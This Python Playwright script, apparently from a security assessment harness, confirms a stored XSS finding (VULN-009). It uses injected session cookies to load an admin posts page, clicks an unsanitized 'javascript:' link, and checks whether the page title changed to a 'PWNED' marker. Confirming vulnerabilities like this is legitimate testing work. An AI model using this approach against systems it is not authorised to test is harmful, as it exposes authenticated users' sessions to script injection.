#!/usr/bin/env python3
"""Runs INSIDE the Playwright container (see lib/browser.py). Confirms VULN-009:
a user-controlled value bound to ->url() renders as an unsanitized `javascript:` href on
the posts table, and clicking it executes the script in the viewer's authenticated session.

Reads env: BASE_URL, SUFFIX, COOKIES ("name=value;name=value"), EVID_DIR.
Prints HREF=, TITLE_BEFORE=, TITLE_AFTER=, RESULT=PASS/PARTIAL/FAIL. Exits 0/1/2.
"""
import os
import sys
from playwright.sync_api import sync_playwright

BASE = os.environ["BASE_URL"]
SUFFIX = os.environ["SUFFIX"]
EVID = os.environ.get("EVID_DIR", "/work")
cookies = []
for pair in os.environ.get("COOKIES", "").split(";"):
    if "=" in pair:
        n, v = pair.split("=", 1)
        cookies.append({"name": n, "value": v, "url": BASE})
EXPECT_TITLE = f"PWNED-{SUFFIX}"


def main() -> int:
    with sync_playwright() as p:
        b = p.chromium.launch(args=["--no-sandbox"])
        ctx = b.new_context()
        if cookies:
            ctx.add_cookies(cookies)
        pg = ctx.new_page()
        pg.goto(f"{BASE}/admin/posts", wait_until="networkidle")
        pg.wait_for_timeout(1200)

        anchor = pg.locator('a[href^="javascript:"]').first
        try:
            anchor.wait_for(timeout=10000)
        except Exception:  # noqa: BLE001
            print("RESULT=FAIL (no javascript: anchor rendered on the posts table)")
            pg.screenshot(path=f"{EVID}/no_anchor.png", full_page=True)
            b.close()
            return 1
        href = anchor.get_attribute("href")
        print(f"HREF={href}")
        pg.screenshot(path=f"{EVID}/rendered_link.png")

        before = pg.title()
        print(f"TITLE_BEFORE={before}")
        try:
            anchor.click(timeout=6000)
        except Exception as e:  # noqa: BLE001
            print(f"[warn] click raised {e}; dispatching")
            anchor.dispatch_event("click")
        pg.wait_for_timeout(1500)
        after = pg.title()
        print(f"TITLE_AFTER={after}")
        pg.screenshot(path=f"{EVID}/after_click.png")
        b.close()

        js_scheme = bool(href and href.lower().startswith("javascript:"))
        executed = (after == EXPECT_TITLE)
        if js_scheme and executed:
            print("RESULT=PASS (server emitted javascript: href AND it executed on click)")
            return 0
        if js_scheme:
            print("RESULT=PARTIAL (javascript: href emitted; execution not observed)")
            return 2
        print("RESULT=FAIL")
        return 1


if __name__ == "__main__":
    sys.exit(main())
